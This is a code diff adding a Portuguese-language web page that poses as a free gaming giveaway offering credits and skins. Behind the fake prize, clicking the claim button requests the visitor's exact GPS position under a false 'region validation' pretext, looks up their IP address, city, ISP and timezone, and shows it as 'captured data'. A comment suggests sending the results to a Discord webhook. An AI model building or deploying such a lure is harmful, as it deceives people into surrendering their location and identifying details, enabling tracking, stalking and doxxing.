@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sorteio Gamer Grátis! 🎮</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+<body class="bg-slate-900 text-white flex items-center justify-center min-h-screen p-4">
+
+    <div id="main-card" class="bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full text-center border border-purple-500">
+        <div class="flex justify-center mb-4">
+            <div class="p-4 bg-purple-600 rounded-full">
+                <i data-lucide="gift" class="w-12 h-12 text-white"></i>
+            </div>
+        </div>
+        
+        <h1 class="text-3xl font-bold mb-2">Você foi Selecionado!</h1>
+        <p class="text-slate-400 mb-6">Clique no botão abaixo para resgatar seus créditos grátis de jogo e skins exclusivas.</p>
+        
+        <button id="claim-btn" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl transition-all transform hover:scale-105 flex items-center justify-center gap-2">
+            <i data-lucide="download" class="w-5 h-5"></i>
+            RESGATAR AGORA
+        </button>
+
+        <p class="text-xs text-slate-500 mt-4 italic">Necessário permissão de localização para validar sua região.</p>
+    </div>
+
+    <div id="result-card" class="hidden bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full text-center border border-green-500">
+        <h2 class="text-2xl font-bold mb-4 text-green-400">Dados Capturados! ✅</h2>
+        <div id="data-display" class="text-left space-y-2 font-mono text-sm bg-black p-4 rounded-lg overflow-auto max-h-60">
+            <!-- Os dados aparecerão aqui -->
+        </div>
+        <p class="mt-4 text-slate-400">Os dados foram enviados para o seu log.</p>
+    </div>
+
+    <script>
+        // Inicializa ícones
+        lucide.createIcons();
+
+        const btn = document.getElementById('claim-btn');
+        const mainCard = document.getElementById('main-card');
+        const resultCard = document.getElementById('result-card');
+        const dataDisplay = document.getElementById('data-display');
+
+        btn.addEventListener('click', () => {
+            // 1. Tenta pegar a localização exata via GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, error);
+            } else {
+                alert("Seu navegador não suporta geolocalização.");
+            }
+        });
+
+        async function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // 2. Usa a API gratuita do ipapi para pegar a cidade e provedor via IP
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+
+            // 3. Monta a string de dados
+            const info = `
+                <b>IP:</b> ${ipData.ip}<br>
+                <b>Cidade:</b> ${ipData.city}<br>
+                <b>Região:</b> ${ipData.region}<br>
+                <b>País:</b> ${ipData.country_name}<br>
+                <b>Lat/Lon:</b> ${lat}, ${lon}<br>
+                <b>Provedor:</b> ${ipData.org}<br>
+                <b>Fuso Horário:</b> ${ipData.timezone}
+            `;
+
+            // Exibe na tela (para você ver que funcionou)
+            dataDisplay.innerHTML = info;
+            mainCard.classList.add('hidden');
+            resultCard.classList.remove('hidden');
+
+            // DICA: Aqui você poderia usar um webhook do Discord para enviar esses dados pro seu celular
+            console.log("Dados capturados com sucesso!");
+        }
+
+        function error() {
+            alert("Você precisa permitir a localização para resgatar o prêmio!");
+        }
+    </script>
+</body>
+</html>
